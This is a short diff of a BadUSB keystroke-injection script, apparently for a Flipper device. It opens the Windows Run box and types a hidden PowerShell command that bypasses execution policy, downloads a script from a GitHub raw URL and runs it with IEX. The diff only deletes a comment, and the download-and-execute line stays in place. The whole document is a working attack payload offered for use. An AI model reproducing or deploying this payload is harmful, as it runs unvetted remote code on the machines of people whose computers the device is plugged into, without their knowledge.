@@ -1,6 +1,5 @@
 REM Open Run Box
 GUI r
 DELAY 500
-REM Download and Execute in one hidden line
 STRING powershell -w h -ep bypass -c "IEX (iwr 'https://raw.githubusercontent.com/J-Reboia/TheFunHouse/refs/heads/main/Flipper/BadUsb/Honk/Honk.ps1').Content"
 ENTER
